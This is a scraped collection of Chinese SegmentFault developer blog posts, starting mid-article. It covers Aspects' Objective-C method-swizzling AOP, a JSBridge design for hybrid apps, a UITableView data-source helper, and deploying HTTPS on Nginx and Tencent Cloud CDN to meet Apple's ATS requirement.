<p>这样就完成了前置工作，接下来我们简单来讲什么是 _objc_msgForward</p>
<h2>Objc 消息转发简介</h2>
<p>我们这篇，主要是讲 Aspects 提供的解决方案，所以不会展开阐述 objc runtime 的一些内容，所以先提供参考资料：</p>
<p><a href=""http://blog.ibireme.com/2013/11/26/objective-c-messaging/"" rel=""nofollow noreferrer"">http://blog.ibireme.com/2013/...</a></p>
<p>objc 中发送消息的方式是主要是在 C 层面调用 obj_msgSend 方法，如果找不到消息的实现，它会尝试进行转发，原理是把函数的实现改为 _objc_msgForward，它是一个函数指针</p>
<p>在转发过程中，objc 会把方法签名包装成 Invocation 传入到 <code>forwardInvocation:</code> 里，以下是对博文的引用：</p>
<blockquote>
<ul>
<li><p>Test NSObject initialize</p></li>
<li><p>Test NSObject new</p></li>
<li><p>Test NSObject alloc</p></li>
<li><p>Test NSObject allocWithZone:</p></li>
<li><p>Test NSObject init</p></li>
<li><p>Test NSObject performSelector:</p></li>
<li><p>Test NSObject resolveInstanceMethod:</p></li>
<li><p>Test NSObject forwardingTargetForSelector:</p></li>
<li><p>Test NSObject methodSignatureForSelector:</p></li>
<li><p>Test NSObject class</p></li>
<li><p>Test NSObject doesNotRecognizeSelector:</p></li>
</ul>
<p>结合NSObject文档可以知道，_objc_msgForward 消息转发做了如下几件事：</p>
<ol>
<li><p>调用resolveInstanceMethod:方法，允许用户在此时为该Class动态添加实现。如果有实现了，则调用并返回。如果仍没实现，继续下面的动作。</p></li>
<li><p>调用forwardingTargetForSelector:方法，尝试找到一个能响应该消息的对象。如果获取到，则直接转发给它。如果返回了nil，继续下面的动作。</p></li>
<li><p>调用methodSignatureForSelector:方法，尝试获得一个方法签名。如果获取不到，则直接调用doesNotRecognizeSelector抛出异常。</p></li>
<li><p>调用forwardInvocation:方法，将地3步获取到的方法签名包装成Invocation传入，如何处理就在这里面了。<br>上面这4个方法均是模板方法，开发者可以override，由runtime来调用。最常见的实现消息转发，就是重写方法3和4，吞掉一个消息或者代理给其他对象都是没问题的。</p></li>
</ol>
</blockquote>
<p>经过以上，我们知道了，如果方法的实现是<code>_objc_msgForward</code>的话，那我们的消息就会被包装成<code>Invocation</code>发送到<code>forwardInvocation</code>里去，那么在前面，我们进行<code>subclass</code>的时候，就会<code>forwardInvocation</code>进行了<code>hook</code>，这时候就用到了！<br>看看 Aspects 是如何做的吧。</p>
<h2>偷梁换柱</h2>
<p>具体函数在<code>aspect_swizzleForwardInvocation</code>中实现</p>
<pre><code class=""objc"">static NSString *const AspectsForwardInvocationSelectorName = @""__aspects_forwardInvocation:"";
static void aspect_swizzleForwardInvocation(Class klass) {
    NSCParameterAssert(klass);
    // If there is no method, replace will act like class_addMethod.
    IMP originalImplementation = class_replaceMethod(klass, @selector(forwardInvocation:), (IMP)__ASPECTS_ARE_BEING_CALLED__, ""v@:@"");
    if (originalImplementation) {
        class_addMethod(klass, NSSelectorFromString(AspectsForwardInvocationSelectorName), originalImplementation, ""v@:@"");
    }
    AspectLog(@""Aspects: %@ is now aspect aware."", NSStringFromClass(klass));
}</code></pre>
<p>我们看到，<code>Aspects</code>把<code>forwardInvocation</code>的实现换成了<code>__ASPECTS_ARE_BEING_CALLED__</code>这个函数，而原始的<code>forwardInvocation</code>实现的名字就变成了<code>__aspects_forwardInvocation</code><br>看看<code>__ASPECTS_ARE_BEING_CALLED__</code>这里干了什么</p>
<pre><code>// This is the swizzled forwardInvocation: method.
static void __ASPECTS_ARE_BEING_CALLED__(__unsafe_unretained NSObject *self, SEL selector, NSInvocation *invocation) {
    NSCParameterAssert(self);
    NSCParameterAssert(invocation);

    // 得到原始 selector
    SEL originalSelector = invocation.selector;
    // 得到原始 selector 的别名（之前被我们添加到类里了），这才是真正的实现
    SEL aliasSelector = aspect_aliasForSelector(invocation.selector);
    // 替换 selector
    invocation.selector = aliasSelector;
    AspectsContainer *objectContainer = objc_getAssociatedObject(self, aliasSelector);
    AspectsContainer *classContainer = aspect_getContainerForClass(object_getClass(self), aliasSelector);
    AspectInfo *info = [[AspectInfo alloc] initWithInstance:self invocation:invocation];
    NSArray *aspectsToRemove = nil;

    // Before hooks.
    aspect_invoke(classContainer.beforeAspects, info);
    aspect_invoke(objectContainer.beforeAspects, info);

    // Instead hooks.
    BOOL respondsToAlias = YES;
    if (objectContainer.insteadAspects.count || classContainer.insteadAspects.count) {
        aspect_invoke(classContainer.insteadAspects, info);
        aspect_invoke(objectContainer.insteadAspects, info);
    }else {
        Class klass = object_getClass(invocation.target);
        do {
            if ((respondsToAlias = [klass instancesRespondToSelector:aliasSelector])) {
                [invocation invoke];
                break;
            }
        }while (!respondsToAlias &amp;&amp; (klass = class_getSuperclass(klass)));
    }

    // After hooks.
    aspect_invoke(classContainer.afterAspects, info);
    aspect_invoke(objectContainer.afterAspects, info);

    // 以上就是执行 hook 的具体内容了

    // If no hooks are installed, call original implementation (usually to throw an exception)
    if (!respondsToAlias) {
        // 如果没有执行的话。。那么只好执行默认的 forwardInvocation 了
        invocation.selector = originalSelector;
        SEL originalForwardInvocationSEL = NSSelectorFromString(AspectsForwardInvocationSelectorName);
        if ([self respondsToSelector:originalForwardInvocationSEL]) {
            ((void( *)(id, SEL, NSInvocation *))objc_msgSend)(self, originalForwardInvocationSEL, invocation);
        }else {
            [self doesNotRecognizeSelector:invocation.selector];
        }
    }

    // 做一些额外的清理
    // Remove any hooks that are queued for deregistration.
    [aspectsToRemove makeObjectsPerformSelector:@selector(remove)];
}</code></pre>
<p>以上就是<code>Aspects</code> hook objc 进行 AOP 全过程，虽然只有短短一千行不到的代码，却提供了很方便的方式进行 AOP，实现也很巧妙。<br>看完后对 objc runtime 羡慕不已，实在强大！</p>

                ", Aspects AOP 的实现,1531971989,401,1,336,1,1,https://segmentfault.com/a/1190000008020853
79,1,0,6,"
                    
<h2><strong>前期调研</strong></h2>
<p>调研对象：<br>支付宝，微信，云之家</p>
<p>调研文档：<br><a href=""http://blog.csdn.net/namepeng/article/details/52778194"" rel=""nofollow noreferrer"">Android中JS与Java的极简交互库 SimpleJavaJsBridge</a></p>
<h2><strong>设计需求</strong></h2>
<ol>
<li><p>阅读类型的业务功能页面需要由前端H5实现，需要做到服务端可控；</p></li>
<li><p>页面界面更改减少重新发布新版本的频率；</p></li>
<li><p>功能页面部分原型需求无法实现，需要原生功能支持；</p></li>
<li><p>对未来业务功能的拓展，方便迭代；</p></li>
</ol>
<h2><strong>作用和意义</strong></h2>
<ol>
<li><p>定制化JSBridge实际上是拓展NativeApp的hybrid程度, 参照微信和支付宝，可打造APP强力的生态圈；</p></li>
<li><p>jsBridge在支付，钱包，媒体拓展，图片处理，活动页面，用户地理位置网络状态都能得到原生强有力支持；</p></li>
<li><p>对于阅读性页面有更多拓展；</p></li>
</ol>
<h2><strong>优秀的通信设计方案</strong></h2>
<blockquote><ol>
<li><p>前端和Native对对方的细节知道的越少越好，减少耦合度，暴露的接口尽量控制在5个以内;</p></li>
<li><p>js与Native之间的通信，最好定义一套通信协议或者规则，减少js代码为兼容不同系统而过多if;</p></li>
<li><p>主动发送消息给对方时，对方尽量对该消息进行反馈，即使无需求对某些功能做反馈，减少if判断的兼容代码;</p></li>
</ol></blockquote>
<h2><strong>实现方式(交互形式)</strong></h2>
<h3><strong>Native 调用 JS </strong></h3>
<p>使用前端暴露在window下的一个方法或者一个对象的方法;<br><code>_handlerFromApp(message)</code><br><code>JSBridge._handlerFromApp(message)</code></p>
<p>方法名: <code>handlerFromApp</code><br>参数:</p>
<pre><code class=""javascript"">message: {
  cbId  : ""cb_(:id)_(:timeStamp)"",      //回调函数的id
  status: 0,                            //状态数据 (0:失败, 1:成功)
  msg   : ""ok"",                         //反馈的消息
  data  : {
    //...                               //一些处理后的数据
  } 
}</code></pre>
<p>以下提供的部分参考方法<br>未对其进行真实测试，因为我使用的是iframe的方法，但原理几乎相同<br>建议封装后提供给Native开发工程师放入对应的APP包中，在webView读取页面的时候用对应的Native语言注入页面，避免页面在前端导入被抓取;</p>
<pre><code class=""javascript"">var doc = JSBridge || window;
var uniqueId = 1;
var invokeCBMap = {};
var listenCBMap = {};

//
function _send(type, funcName, data, cb) {
  var _id = 'cb_' + (uniqueId++) + '_' + new Date().getTime();
  data.cbId = _id;
  if (type == 'invoke') 
    invokeCBMap[_id] = cb;
  else if (type == 'listen')
    listenCBMap[_id] = cb;
  doc[type](funcName, data);
}
doc._handlerFromApp = function(msg) {
  var _id = msg.cbId,
      callback;
  if (_id) {
    callback = invokeCBMap[_id] || listenCBMap[_id];
    if (callback) {
      delete msg.cbId;
      callback(msg.data);
      delete invokeCBMap[_id];
    } else {
      console.error('不存在该回调方法');
    }
  }
}</code></pre>
<h3><strong>JS调用Native</strong></h3>
<p>以下只介绍前两个方法，第三个和第二个比较类似</p>
<ul>
<li><p>A. Native暴露一个含有通信方法的类给web调用</p></li>
<li><p>B. Native拦截iframe请求</p></li>
<li><p>C. Native拦截prompt弹出框</p></li>
</ul>
<h4>A 一个包含调用方法的类</h4>
<p>iOS    : 可使用javascriptCore      <br>Android: 直接使用WebView的addJavascriptInterface方法</p>
<p><strong>将一个js对象绑定到一个Native类，在类中实现相应的函数，当js需要调用Native的方法时，只需要直接在js中通过绑定的对象调用相应的函数</strong></p>
<p>确定对象名称: <code>(:AppName)JSBridge</code></p>
<p>Native提供的对象含有的方法:</p>
<ul>
<li><p><code>invoke(funcName, data)</code></p></li>
<li><p><code>listen(funcName, data)</code></p></li>
</ul>
<p><code>invoke</code>:用于web页面调用Native私有方法的通用方法<br><strong>参数</strong>: <code>funcName</code>， <code>data</code><br><code>funcName</code>：对应为Native内部私有方法的方法名或映射<br><code>data</code>    ：web传递给Native的必要数据<br><code>data</code>数据结构如下:</p>
<pre><code class=""javascript"">{
  cbId : ""cb_(:id)_(:timeStamp)"",  //回调函数的id
  msg  : {}                        //提供给使用方法执行的一些参数
}
/** 
  //1.拿wx参考为例
  wx.previewImg({
    current: 'http://xxx_1.png',
    urls   : [
      'http: //xxx_0.png',
      'http: //xxx_1.png',
      'http: //xxx_2.png',
      'http: //xxx_3.png',
    ]
  });
  //2.因为wx对jsbridge进行了一次封装,jssdk, 而我们在未封装时应该如下使用
  JSBridge.invoke('imagePreview', {
    cbId : ""cb_(:id)_(:timeStamp)"",
    msg : {
      current: 'http://xxx_1.png',
      urls   : [
        'http: //xxx_0.png',
        'http: //xxx_1.png',
        'http: //xxx_2.png',
        'http: //xxx_3.png',
      ]
    }
  });
*/</code></pre>
<p>那么当调用之后，Native执行完成对应的私有方法后，执行一次我们提供的回调接口，以下是javascript的语法，请Native开发工程师对应修改</p>
<pre><code class=""javascript"">JSBridge.handlerFromApp({
  cbId  : ""cb_(:id)_(:timeStamp)"", //web传给Native的cbId
  status: 1,                       //状态数据 (0:失败, 1:成功)
  msg   : ""预览成功"", 
  data  : {} 
});</code></pre>
<p><code>listen</code>是一个用于web页面监听Native方法实现的通用方法<br><strong>使用环境</strong>: 不属于web页面上的操作。当用户直接操作Native上的功能来影响或发送数据给web，或者操作的功能需要用到web页面上的数据，我们需要告知Native我们希望能收到回调;<br>例子：<br><strong>微信监听分享操作</strong></p>
<ol>
<li><p>分享的内容是web上的内容（标题，描述，图片）;</p></li>
<li><p>获取分享操作是否完成和分享操作的数据收集;</p></li>
<li><p>分享按钮是原生APP提供；</p></li>
</ol>
<p>数据结构和操作与<code>invoke</code>相似，对应Native开发哥们接收到listen操作后需要存储一个映射，在被监听的操作实现上判断是不是需要执行web端提供的回调接口；</p>
<p><strong><code>注意:</code></strong>有关<code>java</code> <code>addJavascriptInterface</code>的使用有漏洞，详情见参考第二条链接，未验证，仅供读者自行权衡;</p>
<h4>B iframe的魔法</h4>
<p>由于Native App可以监听webview的请求，所以web端通过创建一个隐藏的iframe，请求商定后的统一协议来发送数据给Native App;</p>
<pre><code class=""javascript"">function createIframeCall(url) {
  setTimeout(function() {
    var iframe = document.createElement('iframe');
    iframe.style.width = '1px';
    iframe.style.height = '1px';
    iframe.style.display = 'none';
    iframe.src = url;
    document.body.appendChild(iframe);
    setTimeout(function() {
        document.body.removeChild(iframe);
    }, 100);
  }, 0);
}</code></pre>
<p><code>url</code>格式:<br>(:scheme)://register_type?func=(:funcName)&amp;cbId=(:cbId)&amp;data={...}&amp;verifyTimeStamp=(:new Date().getTime())</p>
<p><code>scheme</code>:协议，可用appName，两端商定，例如weixin,alipayjsbridge</p>
<p><code>register_type</code>: 注册形式，即<code>invoke</code>还是<code>listen</code></p>
<p><code>funcName</code>: Native内的方法名或映射</p>
<p><code>cbId</code>:见上文</p>
<p><code>data</code>:详细数据</p>
<p><code>verifyTimeStamp</code>:验证的时间参数，不必须</p>
<pre><code class=""javascript"">;(function() {
    if (window.ZaihuJSBridge) return;
    var CUSTOM_PROTOCOL_SCHEME = 'zaihu';
    var REGISTER_INVOKE = 'invoke';
    var REGISTER_LISTEN = 'listen';
    var uniqueId = 1;
    var invokeCbMap = {};
    var listenCbMap = {};
    function dataHandler(type, funcName, data, cb) {
      var register_type = '';
      switch (type) {
        case 'invoke': 
          register_type = REGISTER_INVOKE;break;
        case 'listen': 
          register_type = REGISTER_LISTEN;break;
        default: break;
      }
      var cbId = '';
      if (cb) {
        cbId = 'cb_' + (uniqueId++) + '_' + new Date().getTime();
        invokeCBMap[cbId] = cb;
      }
      var dataStr = '';
      if (data) dataStr = encodeURIComponent(JSON.stringify(data));
      var paramStr = CUSTOM_PROTOCOL_SCHEME + '://' + register_type + '?func=' + funcName + (cbId ? ('&amp;cbId=' + cbId): '') + (data ? ('&amp;data=' + dataStr): '');
      createIframeCall(paramStr);
        }
    function _invoke(nativeFuncName, data, cb) {
      dataHandler('invoke', nativeFuncName, data, cb);
    }
    
    function _listen(h5FuncName, data, cb) {
      dataHandler('listen', h5FuncName, data, cb);
    }
    function _handlerFromZaihu(msg) {
      var data = JSON.parse(msg);
      var cbId = data.cbId;
      var cb = invokeCBMap[cbId] || listenCBMap[cbId];
      if (cb) {
        delete data.cbId &amp;&amp; cb(data) &amp;&amp; delete invokeCBMap[cbId];
      }
    }
      var app;
    
      app = {
        version: '0.1',
        invoke: _invoke,
        on: _listen,
        log: _log,
        author: '伊吾鱼O(∩_V)O',
        // private
        _handlerFromApp: _handlerFromApp
      };
      window.JSBridge = app;
})()</code></pre>
<h4><strong>协作</strong></h4>
<ul>
<li><p>需要Native开发兄弟在webview开启时候为页面注入jsbridge.js代码并执行（防止被前端浏览器直接查看源代码了解app的代码逻辑）</p></li>
<li><p>获取参数执行对应的功能后，执行回调</p></li>
</ul>
<h2><strong>页面前期准备</strong></h2>
<p>1.app打开webview<br>2.loadUrl(页面url)<br>3.监听webview开始，并执行一段js代码将包内的jsbridge.js文件引入页面中;</p>
<h2><strong>功能业务逻辑</strong></h2>
<ol>
<li><p>web页面调用请求接口    <br>jsbridge.invoke(funcName, data);(A方法：Native提供，B&amp;C方法: 前端实现);</p></li>
<li><p>接口调用原生功能</p></li>
<li><p>原生功能完成后执行回调</p></li>
</ol>
<h2><strong>比较</strong></h2>
<p>A：android曝<a href=""http://blog.csdn.net/zhaoxy_thu/article/details/22794201?utm_source=tuicool&amp;utm_medium=referral"" rel=""nofollow noreferrer"">安全漏洞</a>，但相对来说实现简单，调用方式容易，且传递参数，无需前端搭建jsbridge,只需要封装易用的sdk，App不需要读取本地静态js文件;</p>
<p>B: iframe规定协议，规范统一，需要前端实现jsbridge和封装sdk, iframe通过url的方式，数据统一为字符串格式，数据量受限制，两端要转义字符；</p>
<p>C: prompt在一些安卓设备受系统劫持，监听prompt兼容性需要测试，也是字符串形式，数据量不受限，需要转义字符;</p>
<p>还有很多参考页面未注明，以及文中有问题的地方欢迎提出。</p>
<blockquote><p>相关参考<br><a href=""http://blog.csdn.net/zhaoxy_thu/article/details/22794201?utm_source=tuicool&amp;utm_medium=referral"" rel=""nofollow noreferrer""> iOS中Objective-C与JavaScript之间相互调用的实现（实现了与Android相同的机制）</a><br><a href=""http://blog.csdn.net/coder_nice/article/details/53116446"" rel=""nofollow noreferrer"">Android WebView的Js对象注入漏洞解决方案（JSBridge存在的意义）</a></p></blockquote>

                ", 原生App与javascript交互之JSBridge接口原理、设计与实现,1531971991,357,1,241,1,1,https://segmentfault.com/a/1190000008012111
80,1,0,6,"
                    
<p>嘛，开始之前先双手奉上Github项目地址，欢迎各位大佬star：<br><a href=""https://github.com/WAMaker/WAMSimpleDataSource"" rel=""nofollow noreferrer"">https://github.com/WAMaker/WA...</a></p>
<h3>序</h3>
<p>相信做iOS开发的小伙伴们经常会遇到这样的页面：</p>
<p><span class=""img-wrap""><img data-src=""/img/bVHewi?w=750&amp;h=1334"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""账号和密码"" title=""账号和密码""></span><br><span class=""img-wrap""><img data-src=""/img/bVHewj?w=750&amp;h=1334"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""消息推送设置"" title=""消息推送设置""></span></p>
<p>对于这样的静态列表我们可以直接用 storyboard 拖一个出来，或者直接用代码创建。我个人的话会选择用代码直接创建，但是之前一直有的问题是没有较好的数据源表示方式，需要对 indexPath 进行硬编码，这导致了在 tableView 的代理里面需要进行判断：</p>
<pre><code>if (indexPath.section == 0) {
    if (indexPath.row == 0) { // email
        // do something
    } else if (indexPath.row == 1) { // phone
        // do something
    }
} else if (indexPath.section == 1) {
    // do something
}</code></pre>
<p>稍微好点的会在相关的判断边上做注释，但是这样写依然容易在往后（产品）调整顺序时调整了一个地方而忘记另外的，总的来说就是代码不够优雅。基于这样的背景，在尝试了各种方式之后，产生了一个可行的解决方案 —— WAMSimpleDataSource。</p>
<h3>设计思路</h3>
<p>在定义 <code>WAMCellInfo</code> 和 <code>WAMSectionInfo</code> 两个类时我选择引入别名（ alias ）来解决 indexPath 的硬编码问题（可能有人会说alias也是硬编码，但这样做提升了代码的可读性=0=）。</p>
<h4><a href=""https://github.com/WAMaker/WAMSimpleDataSource/blob/master/WAMSimpleDataSource/WAMCellInfo.h"" rel=""nofollow noreferrer"">WAMCellInfo</a></h4>
<p><code>WAMCellInfo</code> 为 cell 的创建提供了最基本的信息，如 reuseIdentifier ，title，detail。用户也能传入自定义的 cell 而不必担心循环引用的问题。</p>
<h4><a href=""https://github.com/WAMaker/WAMSimpleDataSource/blob/master/WAMSimpleDataSource/WAMSectionInfo.h"" rel=""nofollow noreferrer"">WAMSectionInfo</a></h4>
<p><code>WAMSectionInfo</code> 作为 <code>WAMCellInfo</code> 的容器，提供了<strong>添加</strong>，<strong>删除</strong>，<strong>替换</strong>，以及基于 alias 对 <code>WAMCellInfo</code> 和 <code>WAMCellInfo</code> 的<strong>索引</strong>方法。</p>
<h4><a href=""https://github.com/WAMaker/WAMSimpleDataSource/blob/master/WAMSimpleDataSource/WAMDataSource.h"" rel=""nofollow noreferrer"">WAMDataSource</a></h4>
<p><code>WAMDataSource</code> 是所有 <code>WAMSectionInfo</code> 的容器，同样提供了<strong>添加</strong>，<strong>删除</strong>，<strong>替换</strong>，以及基于 alias 对 <code>WAMSectionInfo</code> 的<strong>索引</strong>方法。</p>
<h3>Demo</h3>
<p>让我们就以一个简单的 demo 看下 WAMSimpleDataSource 在静态列表中如何能让代码看起来更简洁。</p>
<pre><code>static NSString *const kReuseIdentifier     = @""tableViewCellIdentifier"";
static NSString *const kIdentifierCellAlias = @""kIdentifierCellAlias"";
static NSString *const kSelfDefineCellAlias = @""kSelfDefineCellAlias"";

static NSString *const kSectionZeroAlias = @""kSectionZeroAlias"";
static NSString *const kSectionOneAlias  = @""kSectionOneAlias"";

#pragma mark - Initialization

// section info初始化
WAMSectionInfo *zero = [WAMSectionInfo infoWithCellInfos:@[] alias:kSectionZeroAlias];
// 添加操作，cell info初始化
[zero appendingCellInfo:[WAMCellInfo infoWithSelfDefineCell:self.customizedCell alias:kSelfDefineCellAlias]];

WAMSectionInfo *one = [WAMSectionInfo infoWithCellInfos:@[
        [WAMCellInfo infoWithReuseIdentifier:kReuseIdentifier title:nil detail:nil alias:kIdentifierCellAlias]
    ] alias:@""oneSectionAlias""];

// data source初始化
self.dataSource = [WAMDataSource dataSourceWithSectionInfos:@[zero, one]];

#pragma mark - UITableViewDataSource

- (NSInteger)numberOfSectionsInTableView:(UITableView *)tableView {
    return self.dataSource.sectionInfos.count;
}

- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section {
    return self.dataSource.sectionInfos[section].cellInfos.count;
}

- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath {
    WAMCellInfo *cellInfo = self.dataSource.sectionInfos[indexPath.section].cellInfos[indexPath.row];
    __kindof UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:cellInfo.identifier forIndexPath:indexPath];

    // 根据不同的alias进行不同的操作
    if ([cellInfo.alias isEqualToString:kSelfDefineCellAlias]) {
        // do something
    } else if ([[cellInfo.alias isEqualToString:kIdentifierCellAlias]) {
        // do something
    }
    .
    .
    .

    return cell;
}

- (CGFloat)tableView:(UITableView *)tableView heightForHeaderInSection:(NSInteger)section {
    return self.dataSource.sectionInfos[section].sectionHeaderHeight;
}

- (CGFloat)tableView:(UITableView *)tableView heightForFooterInSection:(NSInteger)section {
    return self.dataSource.sectionInfos[section].sectionFooterHeight;
}</code></pre>
<h3>总结与缺陷</h3>
<p>现在的 <code>WAMDataSource</code> 还没办法做到直接作为 tableView 的数据源，这是在今后的更新中会解决的问题。虽然 <code>WAMSimpleDataSource</code> 并没有减少很多代码量，但能提升静态列表中代码的可读性以及可维护性，个人觉得还是值得的。</p>
<p>希望各位会喜欢，有问题可以留言或者在 <code>Github</code> 上给我提 <code>PR</code>，非常感谢。</p>
<p>GitHub repo：<a href=""https://github.com/WAMaker/WAMSimpleDataSource"" rel=""nofollow noreferrer"">https://github.com/WAMaker/WA...</a></p>

                ", WAMSimpleDataSource，更优雅的编写静态UITableView,1531971992,405,1,652,1,1,https://segmentfault.com/a/1190000007889665
81,1,0,6,"
                    
<p>2017年1月1日以后，所有iOS需要访问网页的 App 都要面临一个问题：ATS(App Transport Security)。由于 ATS 要求 HTTPS 访问，换句话来说，还有 13 天，苹果就要对 APP 开发者们关闭 HTTP 的大门了。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000007852340"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""Apple + ATS"" title=""Apple + ATS""></span></p>
<h2>1、什么是 ATS？</h2>
<p>ATS 全称 App Transport Security，是 iOS 9 引入的一套安全机制，默认行为会强制保证所有的网络请求都使用 HTTPS。</p>
<h2>2、绕过 ATS？</h2>
<p>由于这样的要求影响非常广，苹果也是考虑到开发者的过渡问题，预留了一些绕过 ATS 的方法。比如，可以通过在 <code>Info.plist</code> 中添加 <code>NSAppTransportSecurity</code> 字典并且将 <code>NSAllowsArbitraryLoads</code> 设置为 YES 来禁用 ATS。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000007852341"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""绕过 ATS？"" title=""绕过 ATS？""></span></p>
<p>但是到了 WWDC 16 后，苹果对 ATS 的推进力度加大，要求从 2017 年 1 月 1 日起，所有的新提交 app 默认是不允许使用 <code>NSAllowsArbitraryLoads</code> 来绕过 ATS 限制的。</p>
<p>虽然还有其他的一些方法，但是紧随苹果的脚步，<strong>采用 HTTPS 传输显然是更好、更安全的一个选择</strong>。绕过 ATS 协议并不是一个好的方案，苹果强推 ATS 的目的，也是在于防止意外泄露个人信息，并为应用程序提供默认安全行为。</p>
<h2>3、启用 HTTPS</h2>
<p>在 APP 的服务器上启用 HTTPS 协议其实并没有想象的那么复杂，只需要通过一些简单的步骤部署 SSL 证书即可完成。</p>
<blockquote><p>HTTPS，是指超文本传输安全协议（Hypertext Transfer Protocol Secure），是一种在 HTTP 协议基础上进行传输加密的安全协议，能够有效保障数据传输安全。</p></blockquote>
<p>证书方面，可以选择免费版的 Let's Encrypt，也可以购买权威机构颁发的 CA 证书。后者是一个更加可靠、安全的选择，许多云厂商也提供有类似的 SSL 证书服务，并且可以部署到 CDN 上。</p>
<p>由于笔者个人使用腾讯云的服务比较多，下面以腾讯云为例介绍如何申请、部署 SSL 证书。腾讯云的 SSL 证书是由 GeoTrust 颁发的，可免费使用一年。如果你是阿里云或其他云厂商的用户，可以查看各自对应的证书产品。</p>
<h3>3.1、申请证书</h3>
<p>登录腾讯云之后，前往 <a href=""https://console.qcloud.com/ssl?utm_source=Zhihu&amp;utm_medium=Community&amp;utm_campaign=Community"" rel=""nofollow noreferrer"">SSL 证书管理控制台</a>，点击<strong>申请证书</strong>，会弹出证书选择框。目前只能选择 GeoTrust 颁布的证书，后续似乎会开放更多证书厂商的产品。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000007852342"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""申请证书1"" title=""申请证书1""></span></p>
<p>接下来，需要填写一些申请信息，最重要的是<strong>绑定域名</strong>。假如你的域名的 abc.com，需要填写的必须是类似 a.abc.com 这样非顶级域名。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000007852343"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""申请证书2"" title=""申请证书2""></span></p>
<p>下一步，会要求手动进行 DNS 验证。具体的步骤可参考产品文档：<a href=""https://www.qcloud.com/document/product/400/4142#2.E3.80.81.E6.89.8B.E5.8A.A8dns.E9.AA.8C.E8.AF.81"" rel=""nofollow noreferrer"">域名验证指引</a>。</p>
<p>一般配置正确的话，很快就可以拿到属于自己的免费证书了。据笔者个人的情况来看，大概一刷新就可以通过审核。</p>
<h3>3.2、服务器安装证书</h3>
<p>审核通过后，可以在<a href=""https://console.qcloud.com/ssl?utm_source=Zhihu&amp;utm_medium=Community&amp;utm_campaign=Community"" rel=""nofollow noreferrer"">SSL 证书管理控制台</a>看到证书下载链接。先将证书下载到本地，并上传到 App的服务器，为服务器上安装证书做好准备。</p>
<p>这里，我们以较为常用 Nginx 为例介绍具体安装过程。如果使用的是 Apache 或 IIS 等其他服务器，请参考<a href=""https://www.qcloud.com/document/product/400/4143"" rel=""nofollow noreferrer"">官方文档</a>。</p>
<h3>3.2.1 获取证书</h3>
<p>Nginx文件夹内获得SSL证书文件 <code>1_www.domain.com_bundle.crt</code> 和私钥文件 <code>2_www.domain.com.key</code>：</p>
<ul>
<li><p><code>1_www.domain.com_bundle.crt</code> 文件包括两段证书代码 “-----BEGIN CERTIFICATE-----”和“-----END CERTIFICATE-----”</p></li>
<li><p><code>2_www.domain.com.key</code> 文件包括一段私钥代码“-----BEGIN RSA PRIVATE KEY-----”和“-----END RSA PRIVATE KEY-----”。</p></li>
</ul>
<h3>3.2.2 证书安装</h3>
<p>将域名 <code>www.domain.com</code> 的证书文件 <code>1_www.domain.com_bundle.crt</code> 、私钥文件 <code>2_www.domain.com.key</code> 保存到同一个目录，例如 <code>/usr/local/nginx/conf</code> 目录下。</p>
<p>更新Nginx根目录下 <code>conf/nginx.conf</code> 文件如下：</p>
<pre><code class=""sh"">server {
        listen 443;
        server_name www.domain.com; #填写绑定证书的域名
        ssl on;
        ssl_certificate 1_www.domain.com_bundle.crt;
        ssl_certificate_key 2_www.domain.com.key;
        ssl_session_timeout 5m;
        ssl_protocols TLSv1 TLSv1.1 TLSv1.2; #按照这个协议配置
        ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:HIGH:!aNULL:!MD5:!RC4:!DHE;#按照这个套件配置
        ssl_prefer_server_ciphers on;
        location / {
            root   html; #站点目录
            index  index.html index.htm;
        }
    }</code></pre>
<p>配置完成后，先用 <code>bin/nginx –t</code> 来测试下配置是否有误。正确无误的话，重启 nginx，就可以使 <a href=""https://www.domain.com"" rel=""nofollow noreferrer"">https://www.domain.com</a> 来访问了。</p>
<h2>4. CDN 上部署 HTTPS</h2>
<p>很多网站都会使用 CDN 服务，因为云厂商一般有提供一些免费的 CDN 流量额度，比如腾讯云就有 60GB 的免费流量。</p>
<p>对于使用了 CDN 的 App 或网站，还可以将 HTTPS 部署在全网 CDN 节点，实现全网数据加密传输功能。</p>
<h3>4.1 配置 HTTPS 的条件：</h3>
<ul>
<li><p><a href=""https://console.qcloud.com/cdn/access"" rel=""nofollow noreferrer"">域名管理页面</a>，域名的状态为 <strong>部署中</strong> 或 <strong>已启动</strong>。</p></li>
<li><p>域名不是由 COS 同步而来的 .file.myqcloud.com 后缀域名。</p></li>
<li><p>域名的接入方式为 自有源 或者 COS源、FTP源。</p></li>
</ul>
<p>登录<a href=""https://console.qcloud.com/cdn/access"" rel=""nofollow noreferrer"">CDN控制台</a>，进入 【域名管理】 页面，点击域名右侧 管理 按钮，进入管理页面：</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000007852344"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>在 【高级配置】中找到 HTTPS 配置模块 </p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000007852345"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<h3>4.2 证书类型</h3>
<p>腾讯云 CDN 目前支持两种方式部署证书：</p>
<ul>
<li><p>自有证书：将自有证书、私钥内容上传至 CDN 进行部署，全程加密传输，证书不落地，保障您的证书安全。</p></li>
<li><p>腾讯云托管证书：也就是上面咱们已经申请成功的 SSL 证书。</p></li>
</ul>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000007852346"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<h3>4.3 证书配置</h3>
